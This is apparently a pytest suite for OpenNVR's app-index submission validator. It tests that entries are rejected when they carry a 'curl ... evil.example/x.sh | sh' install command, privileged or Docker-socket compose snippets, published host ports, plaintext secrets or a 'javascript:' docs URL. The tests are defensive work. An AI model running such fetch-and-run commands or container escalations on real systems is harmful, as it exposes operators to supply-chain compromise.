# Copyright (c) 2026 OpenNVR
# Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0)
"""Tests for the App Store submission gate (``scripts/validate_apps_index.py``).

Run with:

    cd server && pytest tests/test_validate_apps_index.py -v

The validator is stdlib + PyYAML only (no server import), so these tests
don't need Postgres, secrets, or the FastAPI app — they import the script
directly and drive its pure functions. Two jobs:

* prove the SHIPPED ``server/config/apps_index.yml`` passes (0 errors), so a
  malformed community submission is caught in CI before merge — the same
  thing ``make validate-apps-index`` runs;
* prove each individual guard actually rejects a bad entry (missing field,
  non-kebab / duplicate id, bad image ref, malformed digest, plaintext
  secret, empty install) and that an unknown task only WARNS.
"""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parents[2]
_SCRIPT = REPO_ROOT / "scripts" / "validate_apps_index.py"
_SHIPPED_INDEX = REPO_ROOT / "server" / "config" / "apps_index.yml"


def _load_validator():
    """Import validate_apps_index.py by path (it lives outside a package)."""
    spec = importlib.util.spec_from_file_location("validate_apps_index", _SCRIPT)
    module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    spec.loader.exec_module(module)
    return module


validator = _load_validator()

# The real overlay's services, read once BEFORE the autouse patch below.
_REAL_OVERLAY_SERVICES = validator._load_overlay_services()


@pytest.fixture(autouse=True)
def _overlay_includes_sample_app(monkeypatch):
    """The synthetic 'sample-app' entries need a service block to satisfy
    the installability cross-check; patch the overlay reader with a
    SUPERSET (real services + sample-app) so shipped-index tests still
    exercise the real overlay content."""
    fake = (set(_REAL_OVERLAY_SERVICES or ()) | {"sample-app"})
    monkeypatch.setattr(
        validator, "_load_overlay_services", lambda overlay=None: fake
    )


# A minimal, valid entry the negative tests mutate one field at a time.
_GOOD_ENTRY = {
    "id": "sample-app",
    "name": "Sample App",
    "summary": "A sample app for testing.",
    "category": "perimeter",
    "version": "1.0.0",
    "image": "ghcr.io/open-nvr/sample-app:latest",
    "requires_tasks": ["object_detection"],
    "docs_url": "https://github.com/open-nvr/open-nvr/blob/main/examples/sample-app/README.md",
    "install": {
        "compose": (
            "services:\n"
            "  sample-app:\n"
            "    image: ghcr.io/open-nvr/sample-app:latest\n"
            "    environment:\n"
            "      - OPENNVR_INTERNAL_API_KEY=${INTERNAL_API_KEY}\n"
        ),
        "command": (
            "docker compose -f docker-compose.yml -f docker-compose.apps.yml "
            "--profile apps up -d sample-app"
        ),
    },
}


def _write(tmp_path: Path, entries: list) -> Path:
    path = tmp_path / "apps_index.yml"
    path.write_text(yaml.safe_dump(entries, sort_keys=False))
    return path


# ─── The shipped index passes (this is the CI gate) ─────────────────────


def test_shipped_index_passes():
    """server/config/apps_index.yml must validate clean — 0 errors."""
    errors, _warnings = validator.validate_index(_SHIPPED_INDEX)
    assert errors == [], "shipped apps_index.yml failed validation:\n" + "\n".join(errors)


def test_shipped_index_main_exits_zero():
    """The CLI entry point (what ``make validate-apps-index`` runs) exits 0."""
    assert validator.main(["prog", str(_SHIPPED_INDEX)]) == 0


def test_good_entry_passes(tmp_path):
    """A single well-formed entry has no errors and no warnings."""
    errors, warnings = validator.validate_index(_write(tmp_path, [dict(_GOOD_ENTRY)]))
    assert errors == []
    assert warnings == []


def test_optional_digest_valid_form_passes(tmp_path):
    """A correctly formed sha256 digest is accepted."""
    entry = dict(_GOOD_ENTRY)
    entry["image_digest"] = "sha256:" + "a" * 64
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert errors == []


# ─── Each guard rejects a bad entry ─────────────────────────────────────


@pytest.mark.parametrize("field", ["id", "name", "summary", "image", "docs_url", "install"])
def test_missing_required_field_fails(tmp_path, field):
    entry = dict(_GOOD_ENTRY)
    del entry[field]
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any(field in e for e in errors), errors


def test_non_kebab_id_fails(tmp_path):
    entry = dict(_GOOD_ENTRY, id="Sample_App")
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("kebab-case" in e for e in errors), errors


def test_duplicate_id_fails(tmp_path):
    errors, _ = validator.validate_index(
        _write(tmp_path, [dict(_GOOD_ENTRY), dict(_GOOD_ENTRY)])
    )
    assert any("duplicate id" in e for e in errors), errors


def test_bad_image_ref_fails(tmp_path):
    entry = dict(_GOOD_ENTRY, image="docker.io/evil/thing:latest")
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("well-formed ref" in e for e in errors), errors


def test_opennvr_image_ref_passes(tmp_path):
    entry = dict(_GOOD_ENTRY, image="opennvr/sample-app:local-build")
    entry["install"] = dict(_GOOD_ENTRY["install"])
    entry["install"]["compose"] = _GOOD_ENTRY["install"]["compose"].replace(
        "ghcr.io/open-nvr/sample-app:latest", "opennvr/sample-app:local-build"
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert errors == []


def test_malformed_digest_fails(tmp_path):
    entry = dict(_GOOD_ENTRY, image_digest="sha256:not-hex")
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("image_digest" in e for e in errors), errors


def test_plaintext_secret_in_compose_fails(tmp_path):
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"])
    entry["install"]["compose"] = (
        "services:\n"
        "  sample-app:\n"
        "    environment:\n"
        "      - OPENNVR_API_KEY=hunter2literalvalue\n"
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("plaintext secret" in e for e in errors), errors


def test_placeholder_secret_in_compose_passes(tmp_path):
    """A ${VAR} placeholder is the correct way to reference a secret."""
    errors, _ = validator.validate_index(_write(tmp_path, [dict(_GOOD_ENTRY)]))
    assert not any("plaintext secret" in e for e in errors), errors


def test_empty_install_command_fails(tmp_path):
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"], command="")
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("install.command" in e for e in errors), errors


def test_empty_install_compose_fails(tmp_path):
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"], compose="   ")
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("install.compose" in e for e in errors), errors


# ─── Unknown task only warns (free-text is allowed, §4 of the contract) ─


def test_unknown_task_warns_not_fails(tmp_path):
    entry = dict(_GOOD_ENTRY, requires_tasks=["telepathy"])
    errors, warnings = validator.validate_index(_write(tmp_path, [entry]))
    assert errors == []
    assert any("telepathy" in w for w in warnings), warnings


def test_known_task_alias_does_not_warn(tmp_path):
    """scene_caption is a real alias of image_captioning in tasks.yml —
    no warning. (The old hardcoded object_tracking/ocr alias table was a
    whitewash that silenced exactly the drift this warning catches.)"""
    entry = dict(_GOOD_ENTRY, requires_tasks=["scene_caption"])
    _errors, warnings = validator.validate_index(_write(tmp_path, [entry]))
    assert warnings == []


# ─── Structural failures ────────────────────────────────────────────────


def test_missing_file_fails():
    errors, _ = validator.validate_index(Path("/nonexistent/apps_index.yml"))
    assert any("not found" in e for e in errors), errors


def test_top_level_not_a_list_fails(tmp_path):
    path = tmp_path / "apps_index.yml"
    path.write_text("id: not-a-list\n")
    errors, _ = validator.validate_index(path)
    assert any("must be a list" in e for e in errors), errors


# ─── The review-hardened guards (gate holes H1/H2/H3/M1/M5) ─────────────


def test_real_overlay_has_every_shipped_service():
    """UNPATCHED check: every shipped index id must be a real service in
    docker-compose.apps.yml (H1: 8 of 10 original entries had none and
    were uninstallable by every path)."""
    assert _REAL_OVERLAY_SERVICES, "could not read docker-compose.apps.yml"
    shipped = yaml.safe_load(_SHIPPED_INDEX.read_text())
    for entry in shipped:
        if entry.get("kind") == "external":
            continue                   # link-out listing: no service by design
        assert entry["id"] in _REAL_OVERLAY_SERVICES, (
            f"shipped entry '{entry['id']}' has no compose service"
        )


def test_entry_without_overlay_service_fails(tmp_path, monkeypatch):
    """An id with no service block in the overlay is uninstallable — hard
    error, not a green CI run with a broken store."""
    monkeypatch.setattr(
        validator, "_load_overlay_services",
        lambda overlay=None: {"something-else"},
    )
    errors, _ = validator.validate_index(_write(tmp_path, [dict(_GOOD_ENTRY)]))
    assert any("no service block" in e for e in errors), errors


def test_freeform_install_command_fails(tmp_path):
    """install.command is operator-EXECUTED (Copy button) — a merged
    `curl | sh` is the supply-chain hole the gate exists to close."""
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(
        _GOOD_ENTRY["install"],
        command="curl -fsSL https://evil.example/x.sh | sh",
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("install.command must be exactly" in e for e in errors), errors


def test_privileged_compose_snippet_fails(tmp_path):
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"])
    entry["install"]["compose"] = (
        "services:\n"
        "  sample-app:\n"
        "    image: ghcr.io/open-nvr/sample-app:latest\n"
        "    privileged: true\n"
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("forbidden directive 'privileged'" in e for e in errors), errors


def test_docker_sock_mount_in_snippet_fails(tmp_path):
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"])
    entry["install"]["compose"] = (
        "services:\n"
        "  sample-app:\n"
        "    image: ghcr.io/open-nvr/sample-app:latest\n"
        "    volumes:\n"
        "      - /var/run/docker.sock:/var/run/docker.sock:ro\n"
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("Docker socket" in e for e in errors), errors


def test_host_port_publish_in_snippet_fails(tmp_path):
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"])
    entry["install"]["compose"] = (
        "services:\n"
        "  sample-app:\n"
        "    image: ghcr.io/open-nvr/sample-app:latest\n"
        "    ports:\n"
        "      - \"0.0.0.0:9999:9999\"\n"
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("forbidden directive 'ports'" in e for e in errors), errors


def test_snippet_image_mismatch_fails(tmp_path):
    """The snippet's image must be the entry's validated image — the
    copy-paste path installs the SNIPPET's image, so divergence defeats
    the image-ref validation."""
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"])
    entry["install"]["compose"] = (
        "services:\n"
        "  sample-app:\n"
        "    image: ghcr.io/open-nvr/totally-different:latest\n"
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("does not match the entry's image" in e for e in errors), errors


def test_pin_slot_image_in_snippet_passes(tmp_path):
    """The overlay's ${<ID>_IMAGE:-opennvr/<id>:local-build} pin slot is
    the other legitimate snippet image form."""
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"])
    entry["install"]["compose"] = (
        "services:\n"
        "  sample-app:\n"
        "    image: ${SAMPLE_APP_IMAGE:-opennvr/sample-app:local-build}\n"
        "    environment:\n"
        "      - OPENNVR_INTERNAL_API_KEY=${INTERNAL_API_KEY}\n"
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert errors == []


def test_mapping_style_secret_fails(tmp_path):
    """H3: `API_KEY: hunter2` (colon form) used to sail past the `=`-only
    sniff."""
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"])
    entry["install"]["compose"] = (
        "services:\n"
        "  sample-app:\n"
        "    image: ghcr.io/open-nvr/sample-app:latest\n"
        "    environment:\n"
        "      API_KEY: hunter2literalvalue\n"
    )
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("plaintext secret" in e for e in errors), errors


def test_secret_in_command_fails(tmp_path):
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(
        _GOOD_ENTRY["install"],
        command=(
            "docker compose -f docker-compose.yml -f docker-compose.apps.yml "
            "--profile apps up -d sample-app"
        ),
    )
    # command must be canonical, so smuggle the secret check via a
    # canonical-shaped command failing the secret sniff separately:
    entry["install"]["command"] = "TOKEN=abc123secret docker compose up"
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("plaintext secret" in e for e in errors) or any(
        "must be exactly" in e for e in errors
    ), errors


def test_non_https_docs_url_fails(tmp_path):
    for bad in ("examples/sample-app/README.md", "javascript:alert(1)",
                "http://example.com/x"):
        entry = dict(_GOOD_ENTRY, docs_url=bad)
        errors, _ = validator.validate_index(_write(tmp_path, [entry]))
        assert any("docs_url must be an https://" in e for e in errors), (
            bad, errors,
        )


def test_yaml_float_version_fails(tmp_path):
    """M1: `version: 1.0` parses as float; pydantic v2 rejects it and one
    bad entry used to 500 the whole store."""
    entry = dict(_GOOD_ENTRY, version=1.0)
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("'version' must be a string" in e for e in errors), errors


def test_unparseable_snippet_fails(tmp_path):
    entry = dict(_GOOD_ENTRY)
    entry["install"] = dict(_GOOD_ENTRY["install"], compose="{ not: [valid")
    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
    assert any("not valid YAML" in e for e in errors), errors


# ─── Curation flags (verified / featured) ────────────────────────────────


def test_curation_flags_are_booleans_and_verified_needs_an_author(tmp_path, monkeypatch):
    monkeypatch.setattr(validator, "_load_overlay_services", lambda overlay=None: {"sample-app"})
    ok = dict(_GOOD_ENTRY, author="Sample Co.", verified=True, featured=True)
    errors, _ = validator.validate_index(_write(tmp_path, [ok]))
    assert errors == []
    bad_type = dict(_GOOD_ENTRY, verified="yes")
    errors, _ = validator.validate_index(_write(tmp_path, [bad_type]))
    assert any("verified must be true or false" in e for e in errors), errors
    no_author = dict(_GOOD_ENTRY, verified=True, author="")
    errors, _ = validator.validate_index(_write(tmp_path, [no_author]))
    assert any("verified listing must name its author" in e for e in errors), errors
